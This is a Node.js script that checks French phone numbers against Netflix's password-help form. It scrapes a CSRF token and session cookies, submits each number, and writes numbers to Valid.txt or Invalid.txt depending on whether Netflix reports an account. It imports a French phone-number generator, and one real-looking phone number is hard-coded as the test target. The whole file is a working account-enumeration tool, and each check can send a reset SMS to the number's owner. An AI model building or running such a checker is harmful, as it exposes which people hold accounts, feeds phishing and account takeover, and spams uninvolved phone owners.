const request = require('request'),
    fs = require('fs'),
    { genFrance } = require('./utils'),  // Assuming this function generates French phone numbers, but we'll test with a specific number
    delay = ms => new Promise(resolve => setTimeout(resolve, ms));  // Simple delay function

let cookies = '';  // Initialize cookie storage
let csrfToken = '';  // Initialize CSRF token

(async () => {
    const chalk = await import('chalk');

    // Initialize the session and extract CSRF token
    let sessionInitialized = await initializeSession(chalk);

    if (sessionInitialized !== 'fail') {
        // Use the single phone number for testing
        const testNumber = '+33783305798';  // Test number

        // Perform the test with a single phone number
        await check(testNumber, chalk);
    }

})();

function updateCookies(response) {
    const setCookies = response.headers['set-cookie'];
    if (setCookies) {
        cookies += setCookies.map(c => c.split(';')[0]).join('; ') + '; ';
    }
}

function extractCsrfToken(body) {
    // First, log the response body to check if the CSRF token is present and correctly formatted
    console.log("Response Body:", body);

    // Regex to extract CSRF token from hidden input field in the form
    const tokenMatch = body.match(/name="csrfToken" value="(.+?)"/);
    if (tokenMatch) {
        return tokenMatch[1];
    } else {
        console.log('CSRF token not found');
        return null;
    }
}

async function initializeSession(chalk) {
    const options = {
        url: 'https://www.netflix.com/fr/LoginHelp?locale=fr-FR',
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Referer': 'https://www.netflix.com/fr/',
            'Origin': 'https://www.netflix.com',
        },
        followRedirect: true  // Automatically follow redirects
    };

    return new Promise((resolve) => {
        request(options, (error, response, body) => {
            if (error) {
                console.log(`${chalk.default.bold.red('Initialization error:')} ${error}`);
                resolve('fail');
                return;
            }

            if (response.statusCode === 302) {
                console.log('Redirect detected, following redirect...');
            }

            updateCookies(response);  // Capture cookies from the response

            // Log the body of the response to see if it contains the CSRF token
            console.log("Response Body for CSRF Token Extraction:");
            console.log(body);

            csrfToken = extractCsrfToken(body);  // Capture CSRF token from body
            if (!csrfToken) {
                console.log(`${chalk.default.bold.red('Failed to extract CSRF token')}`);
                resolve('fail');
                return;
            }

            console.log(`${chalk.default.bold.blue('>')} Session initialized successfully.`);
            resolve('x');
        });
    });
}

async function check(num, chalk) {
    const postData = {
        'phoneNumber': num,  // Netflix's form field for phone number
        'csrfToken': csrfToken,  // Include CSRF token in the form data
        'action': 'submit'   // Form action for Netflix
    };

    const options = {
        url: 'https://www.netflix.com/fr/LoginHelp',  // Netflix login help URL
        method: 'POST',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': cookies,  // Send cookies from previous responses
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/fr/LoginHelp?locale=fr-FR'
        },
        form: postData,
        followRedirect: true  // Automatically follow redirects
    };

    return new Promise((resolve) => {
        request(options, (error, response, body) => {
            if (error) {
                console.log(`${chalk.default.bold.red('Request error:')} ${error}`);
                resolve('fail');
                return;
            }

            updateCookies(response);  // Update cookies from the response

            // Log response headers to understand the redirection or potential issues
            console.log(`${chalk.default.bold.yellow('Response Headers:')}`, response.headers);
            console.log(`${chalk.default.bold.blue('Response statusCode:')} ${response.statusCode}`);

            // Handle the final response after the redirect
            if (body.includes("nous avons envoyé un SMS")) {
                console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.bold.green(num)} ${chalk.default.bold.green('Valid')}`);
                fs.appendFileSync('Valid.txt', num + '\n');
            } else if (body.includes("Ce numéro de téléphone n'est lié à aucun compte")) {
                console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.bold.red(num)} ${chalk.default.bold.red('Invalid')}`);
                fs.appendFileSync('Invalid.txt', num + '\n');
            } else {
                console.log(`${chalk.default.bold.blue('>')} - ${chalk.default.yellow(num)} ${chalk.default.yellow('Unknown response, possible redirect.')}`);
            }
            resolve('x');
        });
    });
}
